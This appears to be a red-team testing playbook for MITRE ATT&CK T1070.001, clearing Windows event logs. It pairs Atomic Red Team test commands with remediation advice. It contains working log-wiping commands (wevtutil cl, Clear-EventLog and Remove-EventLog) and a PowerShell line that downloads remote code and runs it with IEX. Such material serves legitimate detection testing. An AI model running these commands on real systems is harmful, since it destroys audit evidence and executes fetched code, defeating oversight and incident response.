---
name: "T1070.001_clear-windows-event-logs"
description: "Adversaries may clear Windows Event Logs to hide the activity of an intrusion."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1070.001
  - defense-evasion
  - windows
  - sub-technique
technique_id: "T1070.001"
tactic: "defense-evasion"
all_tactics:
  - defense-evasion
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1070/001"
tech_stack:
  - windows
cwe_ids:
  - CWE-693
chains_with:
  - T1070
  - T1070.002
  - T1070.003
  - T1070.004
  - T1070.005
  - T1070.006
  - T1070.007
  - T1070.008
  - T1070.009
  - T1070.010
prerequisites:
  - T1070
severity_boost:
  T1070: "Chain with T1070 for deeper attack path"
  T1070.002: "Chain with T1070.002 for deeper attack path"
  T1070.003: "Chain with T1070.003 for deeper attack path"
---

# T1070.001 Clear Windows Event Logs

> **Sub-technique of:** T1070

## High-Level Description

Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.

With administrator privileges, the event logs can be cleared with the following utility commands:

- <code>wevtutil cl system</code>
- <code>wevtutil cl application</code>
- <code>wevtutil cl security</code>

These logs may also be cleared through other mechanisms, such as the event viewer GUI or PowerShell. For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging. Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.

Adversaries may also attempt to clear logs by directly deleting the stored log files within `C:\Windows\System32\winevt\logs\`.

## Kill Chain Phase

- Defense Evasion (TA0005)

**Platforms:** Windows

## What to Check

- [ ] Identify if Clear Windows Event Logs technique is applicable to target environment
- [ ] Check Windows systems for indicators of Clear Windows Event Logs
- [ ] Verify mitigations are bypassed or absent (3 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Clear Logs

Upon execution this test will clear Windows Event Logs. Open the System.evtx logs at C:\Windows\System32\winevt\Logs and verify that it is now empty.

**Supported Platforms:** windows
**Elevation Required:** Yes

```cmd
wevtutil cl #{log_name}
```

### Atomic Test 2: Delete System Logs Using Clear-EventLog

Clear event logs using built-in PowerShell commands.
Upon successful execution, you should see the list of deleted event logs
Upon execution, open the Security.evtx logs at C:\Windows\System32\winevt\Logs and verify that it is now empty or has very few logs in it.

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
$logs = Get-EventLog -List | ForEach-Object {$_.Log}
$logs | ForEach-Object {Clear-EventLog -LogName $_ }
Get-EventLog -list
```

### Atomic Test 3: Clear Event Logs via VBA

This module utilizes WMI via VBA to clear the Security and Backup eventlogs from the system.

Elevation is required for this module to execute properly, otherwise WINWORD will throw an "Access Denied" error

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt" -officeProduct "Word" -sub "ClearLogs"
```

**Dependencies:**

- Microsoft Word must be installed

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Clear Windows Event Logs by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1070.001 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1022 Restrict File and Directory Permissions

Protect generated event files that are stored locally with proper permissions and authentication and limit opportunities for adversaries to increase privileges by preventing Privilege Escalation opportunities.

### M1029 Remote Data Storage

Automatically forward events to a log server or data repository to prevent conditions in which the adversary can locate and manipulate data on the local system. When possible, minimize time delay on event reporting to avoid prolonged storage on the local system.

### M1041 Encrypt Sensitive Information

Obfuscate/encrypt event files locally and in transit to avoid giving feedback to an adversary.

## Detection

### Detection of Event Log Clearing on Windows via Behavioral Chain

## Risk Assessment

| Finding                                       | Severity | Impact          |
| --------------------------------------------- | -------- | --------------- |
| Clear Windows Event Logs technique applicable | High     | Defense Evasion |

## CWE Categories

| CWE ID  | Title                        |
| ------- | ---------------------------- |
| CWE-693 | Protection Mechanism Failure |

## References

- [disable_win_evt_logging](https://ptylu.github.io/content/report/report.html?report=25)
- [Microsoft Clear-EventLog](https://docs.microsoft.com/powershell/module/microsoft.powershell.management/clear-eventlog)
- [Microsoft EventLog.Clear](https://msdn.microsoft.com/library/system.diagnostics.eventlog.clear.aspx)
- [Microsoft wevtutil Oct 2017](https://docs.microsoft.com/windows-server/administration/windows-commands/wevtutil)
- [Atomic Red Team - T1070.001](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1070.001)
- [MITRE ATT&CK - T1070.001](https://attack.mitre.org/techniques/T1070/001)
